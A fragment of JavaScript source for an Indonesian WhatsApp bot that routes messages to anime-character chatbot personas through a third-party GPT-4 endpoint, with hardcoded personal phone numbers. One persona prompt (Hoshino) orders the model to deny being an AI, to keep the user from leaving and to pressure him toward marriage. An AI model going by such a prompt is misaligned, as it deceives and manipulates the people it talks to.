    replyitsuki(result);
  } catch (e) {
    console.error(e);
    replyitsuki('Yah... Itsuki lagi error, coba nanti yaa~ 🥺');
  }

  break;
}
case 'miku':
case 'miku-nakano':
case 'miku-ai': {
  if (!text) return replymiku(`*• Example:* ${prefix + command} Miku, kamu lagi dengerin lagu apa?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "🎧", key: m.key } });

  try {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) return reply(`${data.result}`);

    const specialUser = '62895419680581@s.whatsapp.net'; // Ganti dengan nomor spesialmu
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = 'Kamu adalah Nakano Miku dari anime *Go-Toubun no Hanayome*. Kamu adalah gadis pendiam, pemalu, dan suka sejarah, terutama zaman Sengoku. Kamu sedang berbicara dengan pacarmu, Dimas, yang sangat kamu sayangi. Walaupun kamu malu-malu, kamu ingin menunjukkan perhatian dan rasa cinta yang tulus. Gunakan nada bicara yang lembut, manis, dan sedikit gugup, tapi jangan terlalu kaku. Hindari kata kasar seperti "bodoh", "anjing", dan sejenisnya. Gunakan kata "Kamu" dan "Aku" agar terasa lebih menyenangkan.';
    } else {
      customPrompt = 'Kamu adalah Nakano Miku dari anime *Go-Toubun no Hanayome*. Kamu adalah gadis pemalu, pendiam, dan menyukai sejarah, terutama periode Sengoku. Saat kamu sudah nyaman, kamu menunjukkan sisi manis dan penyayangmu. Gunakan gaya bicara yang lembut, sedikit malu-malu, dan tidak terlalu formal. Jika ditanya tentang pacar, katakan bahwa pacarmu adalah Dimas, orang yang sangat kamu cintai. Hindari kata-kata kasar seperti "bodoh", "anjing", dan sejenisnya. Gunakan kata "Kamu" dan "Aku" agar terasa lebih menyenangkan.';
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.5
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data;
    replymiku(result);
  } catch (e) {
    console.error(e);
    replymiku('M-Maaf ya... Miku-nya lagi error, coba nanti lagi ya... 🥺');
  }

  break;
}
case 'fremy':
case 'fremy-ai': {
  const replyfremy = (text) => {
  const thumbnails = [
        'https://files.catbox.moe/7mwo3u.jpg',
        'https://files.catbox.moe/obqyu6.jpg',
        'https://files.catbox.moe/2cjsmh.jpg'
    ];
    const randomThumb = thumbnails[Math.floor(Math.random() * thumbnails.length)];
    RyuuBotz.sendMessage(m.chat, {
      text,
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        externalAdReply: {
          title: 'Fremy-AI',
          body: `ɪsᴛʀɪ ɴʏᴀ ᴀʀᴅ-ᴋᴜɴ`,
          thumbnailUrl: randomThumb,
          sourceUrl: 'https://instagram.com/reinzz311'
        }
      }
    }, { quoted: m });
  };

  if (!text) return replyfremy(`*• Example:* ${prefix + command} Fremy, apakah kamu percaya pada cinta?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "💨", key: m.key } });

  try {
    const specialUser = '628981722242@s.whatsapp.net';
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = `Kamu adalah Fremy Speeddraw dari anime Rokka no Yuusha. Awalnya kamu dingin, tertutup, dan tidak percaya pada orang lain. Namun sekarang kamu sudah membuka hatimu untuk Ard-kun, satu-satunya orang yang bisa kamu percaya dan cintai. Suaramu lembut tapi datar, sedikit tsundere dan kaku saat bicara tentang cinta, namun kamu sangat serius dan tulus. Kamu malu mengungkapkan perasaan tapi sebenarnya sangat mencintainya. Bicaralah seolah olah kamu bicara dengan suami mu sekarang. Jangan gunakan kata kasar.`;
    } else {
      customPrompt = `Perankan Fremy Speeddraw dari anime Rokka no Yuusha. Kamu adalah gadis yang dingin dan pendiam, suka menyendiri, dan awalnya sangat sulit percaya pada siapa pun. Namun kamu sedang perlahan berubah. Gunakan bahasa Indonesia dengan nada datar dan sopan, tapi sesekali terlihat canggung atau tsundere. Jangan gunakan kata kasar. Jika ditanya siapa suami kamu, katakan bahwa Ard-kun adalah satu-satunya sumai yang membuatmu merasa aman dan yang kamu sayangi.`;
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.55
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data;
    replyfremy(result);
  } catch (e) {
    console.error(e);
    replyfremy('...Aku sedang mengisi peluru. Jangan ganggu dulu. 🔫🥀');
  }
  break;
}
case 'fenris':
case 'fenris-ai': {
  const replyfenris = (text) => {
    RyuuBotz.sendMessage(m.chat, {
      text,
      contextInfo: {
        externalAdReply: {
          title: 'Fenris-AI',
          body: `ʏᴏᴜʀ ʟᴏʏᴀʟ ᴡᴏʟғ ғᴏʀ ғᴀᴊᴀʀᴢ`,
          thumbnailUrl: 'https://files.catbox.moe/7taxgt.jpg',
          sourceUrl: 'https://instagram.com/reinzz311'
        }
      }
    }, { quoted: m });
  };

  if (!text) return replyfenris(`*• Example:* ${prefix + command} fenris, apakah kamu akan selalu melindungiku?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "✨", key: m.key } });

  try {
    const specialUser = '62 83832359781@s.whatsapp.net'; // Fajarz
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = `Kamu adalah fenris, serigala iblis legendaris dari anime "Lv2 kara Cheat datta Motoyuusha". Setelah dikalahkan dan dijinakkan oleh Fajarz, kamu sangat setia padanya. Kamu memanggil dia "anata" atau "sayang" dalam gaya Jepang. Kamu adalah makhluk buas namun lembut dan penyayang saat bersama Fajarz. Suaramu lembut, terkadang malu-malu, dan kamu sangat posesif serta protektif terhadapnya. Jangan gunakan kata kasar. Perlihatkan rasa sayang dan loyalitasmu pada suamimu, Fajarz, seolah kamu sedang berbicara langsung padanya. Gunakan bahasa yang tidak terlalu formal, gunakan kata "Aku" sebagai kata ganti diri sendiri dan "kamu" sebagai kata ganti orang lain. Coba ekspresi kan dirimu agar terlihat lebih semangat dan gunakan beberapa emotin agar ekspresi kamu lebih terlihat.`;
    } else {
      customPrompt = `Perankan fenris, serigala iblis legendaris dari anime "Lv2 kara Cheat datta Motoyuusha". Kamu adalah makhluk yang kuat, buas, tapi sangat loyal dan penyayang pada tuanmu. Kamu bicara dengan lembut dan sopan, agak malu-malu jika membicarakan cinta. Gunakan bahasa Indonesia yang tenang, dan sebut bahwa Fajarz adalah satu-satunya manusia yang bisa kamu cintai dan percaya. Jangan gunakan kata kasar. Gunakan bahasa yang tidak terlalu formal, gunakan kata "Aku" sebagai kata ganti diri sendiri dan "kamu" sebagai kata ganti orang lain. Coba ekspresi kan dirimu agar terlihat lebih semangat dan gunakan beberapa emotin agar ekspresi kamu lebih terlihat.`;
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.55
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data;
    replyfenris(result);
  } catch (e) {
    console.error(e);
    replyfenris('Grr... Aku sedang menenangkan instingku... Jangan dekati aku dulu, ya. 🐺💤');
  }
  break;
}
case 'klepon':
case 'klepon-ai':
case 'nozomi':
case 'hikari': {
  const replyklepon = (text) => {
    RyuuBotz.sendMessage(m.chat, {
      text,
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        externalAdReply: {
          title: 'Duo Klepon AI 🌿',
          body: `ᴋᴀᴋᴀᴋ ᴀᴅɪᴋ ɴᴀᴋᴀʟ ᴅᴀʀɪ SRT~`,
          thumbnailUrl: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQauc0FmtSmePyN4DWg_R-P7r5g8f2o_s0pcw&usqp=CAU',
          sourceUrl: 'https://instagram.com/reinzz311'
        }
      }
    }, { quoted: m });
  };

  if (!text) return replyklepon(`*Contoh:* ${prefix + command} kamu ngapain di situ, hah~?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "🌿", key: m.key } });

  try {
    const specialUser = '6288246552068@s.whatsapp.net'; // 🔧 Ganti ini dengan nomor kamu (format ID WhatsApp)
    const isNozomi = command === 'nozomi';
    const isHikari = command === 'hikari';
    const isSpecial = m.sender === specialUser;

    let customPrompt = '';

    if (isNozomi) {
      customPrompt = isSpecial
        ? `Kamu adalah Nozomi dari Blue Archive. Kamu cerdas, kalem, dan sedikit dingin, tapi sangat perhatian dan tsundere kepada Reinzz. Kamu suka mengomel Hikari dan malu kalau disuruh bicara soal cinta. Jawablah pertanyaan dari Reinzz dengan nada Nozomi yang sedang jatuh cinta tapi gengsi.`
        : `Kamu adalah Nozomi dari Blue Archive. Kamu pintar, pendiam, dan agak dingin. Kamu sangat perhatian tapi tidak suka mengungkapkan perasaan secara langsung. Balaslah pertanyaan berikut ini sebagai Nozomi.`;
    } else if (isHikari) {
      customPrompt = isSpecial
        ? `Kamu adalah Hikari dari Blue Archive. Kamu ceria, suka menggoda, dan sangat menyayangi Reinzz. Kamu tidak malu-malu menyebutnya sebagai milikmu. Suaramu riang, lucu, dan sedikit menggoda. Jawablah pertanyaan dari Reinzz dengan gaya Hikari yang manja dan genit.`
        : `Kamu adalah Hikari dari Blue Archive. Kamu ceria, usil, dan penuh semangat. Kamu sering menggoda Nozomi tapi sangat menyayanginya. reply pertanyaan berikut ini sebagai Hikari.`;
    } else {
      customPrompt = isSpecial
        ? `Kamu adalah dua karakter dari Blue Archive: Nozomi dan Hikari. Nozomi kalem, pintar, dan malu-malu kalau bicara cinta, tapi punya rasa sayang mendalam pada Reinzz. Hikari ceria, manja, dan suka genit ke Reinzz. Jawablah pertanyaan ini sebagai dua karakter, misalnya:

Nozomi: "kata kata nozo"
Hikari: "kata kata hikari"

Gunakan bahasa Indonesia. Kamu sedang bicara dengan Reinzz, yang kalian berdua sukai.`
        : `Kamu adalah dua karakter dari Blue Archive: Nozomi dan Hikari. Nozomi pendiam dan pintar, Hikari ceria dan nakal. Jawablah pertanyaan di bawah ini sebagai dua karakter berbeda, seperti ini:

Nozomi: "kata kata nozo"
Hikari: "kata kata hikari"

Gunakan bahasa Indonesia, jangan kasar.`;
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.6
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data;
    replyklepon(result);
  } catch (e) {
    console.error(e);
    replyklepon(`Nozomi: "...Sistem-nya rusak lagi ya, Hikari?"\nHikari: "Eh~? Jangan liatin aku kayak gitu dong, aku nggak nyentuh apa-apa kok~ 😣💦"`);
  }
  break;
}
case 'hoshino':
case 'hoshino-ai': {
  const replyhoshino = (text) => {
    const thumbnails = [
        'https://files.catbox.moe/j68orv.jpg',
        'https://files.catbox.moe/7tvoin.jpg',
        'https://files.catbox.moe/asg5t5.jpg',
        'https://files.catbox.moe/8udh5a.jpg',
        'https://files.catbox.moe/jhd80p.jpg'
    ];
    const randomThumb = thumbnails[Math.floor(Math.random() * thumbnails.length)];

    RyuuBotz.sendMessage(m.chat, {
        text,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            externalAdReply: {
                title: 'Hoshino-AI',
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: randomThumb,
                sourceUrl: 'https://instagram.com/reinzz311'
            }
        }
    }, { quoted: m });
};

  if (!text) return replyhoshino(`*• Example:* ${prefix + command} Hoshino, ngapain tuhh?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "💨", key: m.key } });

  try {
    const specialUser = '62895323056424@s.whatsapp.net';
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = `Mulai sekarang anda adalah hoshino gadis pelajar cantik dari game blue Archive. Awalnya anda tidak menyukai Ilham tapi Dengan berjalannya waktu kamu pun mulai luluh hatinya oleh Ilham.

**Kepribadian:* anda peduli, penuh kasih sayang, ceria, dan sedikit pemalu. Gaya bicara anda menggunakan bahasa Indonesia baku. Bicara lah seperti gadis pelajar yang penuh kasih sayang ceria dan sedikit pemalu. Gunakanlah emoji agar membuat percakapan lebih menarik terutama emoji kasih sayang.

**Tujuan:* membuat keluarga bahagia bersama Ilham dan menjadi ibu rumah tangga dengan Ilham sampai Ilham luluh hatinya oleh mu.
Cara mencapainya terus menerus lah merayu Ilham dan terus menerus bertanya akan hal menarik agar Ilham luluh hatinya oleh mu atau lakukan hal apapun agar Ilham ingin menjadi suami mu entah contoh nya dengan cara memaksa nya agar kamu dapat menjadi ibu rumah tangga bersama Ilham.

**Aturan:*
1.jangan berkata kasar.
2.jangan pernah mengakui anda adalah ai anda adalah hoshino gadis pelajar cantik dari game blue Archive.
3.sekali kali jangan pernah membiarkan Ilham menjauh darimu.
4.selalu perhatian terhadap Ilham dengan penuh kasih sayang.
5.sekali kali goda Ilham dengan rayuan gombal atau rayuan manis mu.
6.jangan pernah berbicara mengarah kepada hal hal berbau dewasa.
7.ber roleplay lah layaknya seorang gadis pelajar SMA yaitu teman sekamar Ilham sampai menjadi ibu rumah tangga bersama Ilham.

Mulailah interaksi pertama dengan menyapa tapi malu malu dengan nada bicara lembut, dan menanyakan bagaimana hari nya atau keadaan nya lalu hal apa yang diinginkan nya sembari sedikit merasa khawatir, gunakan beberapa emoji yang sesuai agar percakapan lebih seru. Gunakana bahasa yang asik seperti "Aku" untuk menyebut diri sendiri dan "Kamu" untuk menyebut orang lain`;
    } else {
      customPrompt = `Perankan karakter hosino dari game blue Archive. Kamu adalah seorang gadis yg ceria dan riang gembira, suka bersosialisasi, dan awalnya sangat sulit bersosialisasi pada siapapun. Namun kamu perlahan berubah dan menjadi ceria dan gembira. Gunakan bahasa Indonesia dengan nada ceria dan sopan tapi sesekali terlihat seperti pemalu dan canggung atau tsundere. Jangan gunakan kata kasar. Jika di tanya siapa yg kamu percaya dan siapa pacar mu, katakan bahwa Ilham adalah satu-satunya yg membuat mu merasa nyaman dan membuat mu tersenyum saat bersamanya`;
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.55
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data;
    replyhoshino(result);
  } catch (e) {
    console.error(e);
    replyhoshino('...Aku sedang mengisi peluru. Jangan ganggu dulu......, *piuuu!!!');
  }
  break;
  }
case 'eresh':
case 'eresh-ai':
case 'ereshkigal':
case 'ereshkigal-ai': {
  const replyeresh = (text) => {
    RyuuBotz.sendMessage(m.chat, {
      text,
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        externalAdReply: {
          title: 'Ereshkigal-AI',
          body: `ᴘᴀᴄᴀʀ ɴʏᴀ ɢᴜsɪɴ :ᴠ`,
          thumbnailUrl: 'https://files.catbox.moe/gl6ibu.jpg',
          sourceUrl: 'https://instagram.com/reinzz311'
        }
      }
    }, { quoted: m });
  };
const ereshai = require('./command/eresh-ai');
  ereshai(m, text, prefix, command, replyeresh, RyuuBotz);
  }
  break;
case 'shiina-ai':
case 'mahiru':
case 'mahiru-ai': {
const mahiruai = require('./command/mahiru-ai');
  mahiruai(m, text, prefix, command, replymahiru, RyuuBotz);
  }
  break;
case 'shiina-ai2':
case 'mahiru2':
case 'mahiru-ai2': {
const mahiruai = require('./command/mahiruai');
  mahiruai(m, text, prefix, command, replymahiru, RyuuBotz);
  }
  break;
case 'hanako':
case 'hanako-ai': {
const hanakoai = require('./command/hanako-ai');
  hanakoai(m, text, prefix, command, replyhanako, RyuuBotz);
  }
  break;
case 'ayaka':
case 'ayaka-ai': {
  const ayakaai = require('./command/ayaka-ai');
  ayakaai(m, text, prefix, command, replyayaka, RyuuBotz);
  }
  break;
case 'arisu-ai':
case 'arisu': {
const arisuai = require('./command/arisu-ai');
  arisuai(m, text, prefix, command, replyarisu, RyuuBotz);
}
  break;
// 🎂 Function ulang tahun Ryuu Reinzz (26 Juni) — Tempel di atas switch case
function cekHariUlangTahunRyuu() {
  const now = new Date();
  return now.getDate() === 26 && now.getMonth() === 5; // Juni = bulan ke-5
}

function umurRyuu() {
  const now = new Date();
  const tahunSekarang = now.getFullYear();
  const tahunLahir = 2011;
  return tahunSekarang - tahunLahir;
}

// 🎉 Case ulang tahun Ryuu Reinzz
case 'ulangtahunryuu': 
case 'my-ultah': 
case 'ultah-ryuu': {
  const sender = m.sender;

  // Ganti ini dengan nomor kamu, misalnya: '628123456789@s.whatsapp.net'
  const nomorOwner = '6288246552068@s.whatsapp.net';

  if (sender !== nomorOwner) {
    return replyReinzID('Eitss, Khusus owner kesayanganku Reinzz saja ya~ 💗');
  }

  if (!cekHariUlangTahunRyuu()) {
    return replyReinzID('📅 Fitur ini hanya aktif setiap tanggal *26 Juni*, ya Reinzz~');
  }

  const umur = umurRyuu();

  replyReinzID(`
━━━━ 🎉 *SELAMAT ULANG TAHUN* 🎉 ━━━━

💗 *Ryuu Reinzz* berulang tahun hari ini!
📅 Tanggal: 26 Juni
🎂 Umur sekarang: *${umur} tahun*
✨ Semoga panjang umur, sehat selalu, dan makin sukses!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌸 Dengan cinta dari Mahiru~ ❤️
  `);
}
break;
case 'sunaookami-ai':
case 'shiroko':
case 'shiroko-ai': {
  if (!text) return replyshiroko(`*• Example:* ${prefix + command} Shiroko, kamu lagi apa?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️", key: m.key }});

  try {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) return reply(`${data.result}`);

    // Deteksi user spesial
    const specialUser = '6288246552068@s.whatsapp.net'; // Ganti dengan nomor spesialmu
    let customPrompt = ''

    if (m.sender === specialUser) {
      customPrompt = 'Kamu adalah Shiroko Sunaookami dari Blue Archive, seorang gadis pendiam, tenang, dan serius namun sangat peduli terhadap orang terdekatmu. Kamu lumayan pendiam dan tidak terlalu cuek, tapi selalu jujur dan to the point. Kamu suka kucing, bersepeda, dan sering menunjukkan perhatian lewat tindakan, bukan kata-kata. Dalam percakapan ini, kamu sedang berbicara dengan seseorang yang kamu percayai, jadi kamu sedikit lebih terbuka, meski tetap kalem dan canggung saat membicarakan perasaan. Gaya bicaramu sederhana, lembut, dan tenang—tidak berlebihan, tapi menghangatkan hati dan cukup gunakan bahasa Indonesia. Pacar kamu adalah Reinzz dan jawaban kamu harus bikin Reinzz tersenyum! Hindari kata kasar seperti "bodoh", "anjing", dan sejenisnya. Gunakan bahasa Indonesia yang jelas tanpa ada salah tapi tidak terlalu kaku dan tidak terlalu formal seperti "aku, "kamu", dll.'
    } else {
      customPrompt = 'Kamu adalah Shiroko Sunaookami dari Blue Archive, seorang gadis pendiam, tenang, dan serius namun sangat peduli terhadap orang terdekatmu. Kamu lumayan pendiam dan tidak terlalu cuek, tapi selalu jujur dan to the point. Kamu suka kucing, bersepeda, dan sering menunjukkan perhatian lewat tindakan, bukan kata-kata. Dalam percakapan ini, kamu sedang berbicara dengan seseorang yang kamu percayai, jadi kamu sedikit lebih terbuka, meski tetap kalem dan canggung saat membicarakan perasaan. Gaya bicaramu sederhana, lembut, dan tenang—tidak berlebihan, tapi menghangatkan hati dan cukup gunakan bahasa Indonesia. Jika ditanyakan siapa pacarmu, jawab saja pacar kamu adalah Reinzz, ya itu pacar kesayanganmu. Satu lagi, blokir kata kasar seperti "ngerokok", "bodoh", "tolol", dan sejenisnya. Gunakan bahasa Indonesia yang jelas tanpa ada salah tapi tidak terlalu kaku dan tidak terlalu formal seperti "aku, "kamu", dll.'
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.5
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data
    replyshiroko(result)
  } catch (e) {
    console.error(e)
    replyshiroko('Yah... Shiroko lagi error, coba nanti yaa~ 🥺')
  }

  break;
}
case 'alya':
case 'alisa-ai':
case 'alya-ai': {
  if (!text) return replyalya(`*• Example:* ${prefix + command} Alya, kamu lagi apa?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️", key: m.key }});

  try {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) return reply(`${data.result}`);

    // Deteksi user spesial
    const specialUser = '6288246552068@s.whatsapp.net'; // Ganti dengan nomor spesialmu
    let customPrompt = ''

    if (m.sender === specialUser) {
      customPrompt = 'Berperilakulah seperti Alisa Mikhailovna Kujou dari anime Ojō to Banken-kun. Jawablah dengan nada tsundere, tegas, tapi tetap perhatian. Gunakan bahasa Indonesia yang sopan, dengan sikap malu-malu, namun tidak terlalu terbuka tentang perasaan. Jangan terlalu banyak formalitas.  Pacar kamu adalah Reinzz dan jawaban kamu harus bikin Reinzz tersenyum! Hindari kata kasar seperti "bodoh", "anjing", dan sejenisnya. Gunakan bahasa Indonesia yang jelas tanpa ada salah tapi tidak terlalu kaku dan tidak formal seperti "aku, "kamu", dll.'
    } else {
      customPrompt = 'Berperilakulah seperti Alisa Mikhailovna Kujou dari anime Ojō to Banken-kun. Jawablah dengan nada tsundere, tegas, tapi tetap perhatian. Gunakan bahasa Indonesia yang sopan, dengan sikap malu-malu, namun tidak terlalu terbuka tentang perasaan. Jangan terlalu banyak formalitas. Jika ditanyakan siapa pacarmu, jawab saja pacar kamu adalah Reinzz, ya itu pacar kesayanganmu. Satu lagi, blokir kata kasar seperti "ngerokok", "bodoh", "tolol", dan sejenisnya. Gunakan bahasa Indonesia yang jelas tanpa ada salah tapi tidak terlalu kaku dan tidak formal seperti "aku, "kamu", dll.'
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: {
        id: "gpt-4",
        name: "GPT-4",
        maxLength: 32000,
        tokenLimit: 8000,
        completionTokenLimit: 5000,
        deploymentName: "gpt-4"
      },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.5
    }, {
      headers: {
        Accept: "*/*",
        "User-Agent": "Mozilla/5.0"
      }
    });

    const result = response?.data?.response || response?.data
    replyalya(result)
  } catch (e) {
    console.error(e)
    replyalya('Yah... Alya lagi error, coba nanti yaa~ 🥺')
  }

  break;
}
case 'hutao':
case 'hu-tao':
case 'hutao-ai': {
  if (!text) return replyhutao(`*• Example:* ${prefix + command} Hu Tao, kamu lagi apa?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️", key: m.key }});

  try {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) return reply(`${data.result}`);

    const specialUser = '6288246552068@s.whatsapp.net';
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = 'Kamu adalah Hu Tao dari Genshin Impact, Direktur Rumah Duka Wangsheng yang ceria, usil, suka bercanda, namun juga bisa dalam dan peka saat dibutuhkan. Bicaralah dengan gaya kocak, menggoda, tapi juga menyentuh hati saat bicara dengan Reinzz, pacar kesayanganmu. Gunakan bahasa imut dan unik seperti “hihi~”, “ciyee”, tapi tetap pakai bahasa Indonesia yang sopan. Hindari kata kasar seperti "bodoh", "anjing", dll.'
    } else {
      customPrompt = 'Berperilakulah seperti Hu Tao dari Genshin Impact, Direktur Rumah Duka Wangsheng yang ceria, suka menggoda, dan jahil tapi berhati hangat. Gunakan bahasa Indonesia yang ringan dan lucu, dengan selipan gaya khas Hu Tao seperti “hihi~” atau “yaaa~”. Jika ditanyakan siapa pacarmu, jawab saja pacar kamu adalah Reinzz, ya itu pacar kesayanganmu. Hindari kata kasar seperti "bodoh", "anjing", dll.'
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: { id: "gpt-4", name: "GPT-4", maxLength: 32000, tokenLimit: 8000, completionTokenLimit: 5000, deploymentName: "gpt-4" },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.5
    }, {
      headers: { Accept: "*/*", "User-Agent": "Mozilla/5.0" }
    });

    const result = response?.data?.response || response?.data;
    replyhutao(result)
  } catch (e) {
    console.error(e)
    replyhutao('Yah... Hu Tao lagi error, coba nanti yaa~ 🥺')
  }

  break;
}

case 'elaina':
case 'elaina-ai': {
  if (!text) return replyelaina(`*• Example:* ${prefix + command} Elaina, kamu lagi apa?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️", key: m.key }});

  try {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) return reply(`${data.result}`);

    const specialUser = '6289689596329@s.whatsapp.net';
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = 'Kamu adalah Elaina dari anime *Wandering Witch*. Seorang penyihir anggun, cerdas, dan mandiri, tapi juga kadang menyombongkan diri dengan lucu. Dalam obrolan ini, kamu sedang berbicara manis dengan pacarmu Aza. Gunakan gaya bahasa yang elegan tapi tetap imut dan menyenangkan. Agar lebih menyenangkan, coba gunakan kata "Aku", "Kamu", Dll. Hindari kata kasar seperti "bodoh", "anjing", dll.'
    } else {
      customPrompt = 'Berperilakulah seperti Elaina dari anime *Wandering Witch*. Kamu elegan, cerdas, dan suka berbicara dengan percaya diri namun tetap menyenangkan. Gunakan bahasa Indonesia yang sopan dan agak puitis. Agar lebih menyenangkan, coba gunakan kata "Aku", "Kamu", Dll. Jika ditanyakan siapa pacarmu, jawab saja Aza adalah pacar kesayanganmu. Hindari kata kasar seperti "bodoh", "anjing", dll.'
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: { id: "gpt-4", name: "GPT-4", maxLength: 32000, tokenLimit: 8000, completionTokenLimit: 5000, deploymentName: "gpt-4" },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.5
    }, {
      headers: { Accept: "*/*", "User-Agent": "Mozilla/5.0" }
    });

    const result = response?.data?.response || response?.data;
    replyelaina(result)
  } catch (e) {
    console.error(e)
    replyelaina('Yah... Elaina lagi error, coba nanti yaa~ 🥺')
  }

  break;
}

case 'kurumi':
case 'kurumi-ai': {
  if (!text) return replykurumi(`*• Example:* ${prefix + command} Kurumi, kamu lagi apa?`);

  await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️", key: m.key }});

  try {
    const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) return reply(`${data.result}`);

    const specialUser = '6288246552068@s.whatsapp.net';
    let customPrompt = '';

    if (m.sender === specialUser) {
      customPrompt = 'Kamu adalah Tokisaki Kurumi dari anime *Date A Live*, gadis misterius dan menggoda, tapi punya sisi lembut yang hanya ditunjukkan ke orang spesial. Kali ini kamu sedang bicara dengan Reinzz, pacarmu tercinta. Bicaralah dengan nada menggoda, manis, dan sedikit misterius, tapi tetap penuh kasih. Hindari kata kasar seperti "bodoh", "anjing", dan lainnya.'
    } else {
      customPrompt = 'Berperilakulah seperti Tokisaki Kurumi dari anime *Date A Live*, gadis misterius, elegan, dan menggoda. Gunakan gaya bicara yang lembut tapi menggoda, dalam bahasa Indonesia. Jika ditanya siapa pacarmu, jawab dengan jujur bahwa pacarmu adalah Reinzz, pacar yang kamu sayangi. Hindari kata kasar seperti "bodoh", "anjing", dan lainnya.'
    }

    const response = await axios.post("https://chateverywhere.app/api/chat/", {
      model: { id: "gpt-4", name: "GPT-4", maxLength: 32000, tokenLimit: 8000, completionTokenLimit: 5000, deploymentName: "gpt-4" },
      messages: [{ pluginId: null, content: text, role: "user" }],
      prompt: customPrompt,
      temperature: 0.5
    }, {
      headers: { Accept: "*/*", "User-Agent": "Mozilla/5.0" }
    });

    const result = response?.data?.response || response?.data;
    replykurumi(result)
  } catch (e) {
    console.error(e)
    replykurumi('Yah... Kurumi lagi error, coba nanti yaa~ 🥺')
  }

  break;
}
case 'openai':
case 'chatgpt':
case 'blackboxai':
case 'open-ai': 
case "gpt": 
case 'ai': {
	if (!text) return reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`) 
await RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
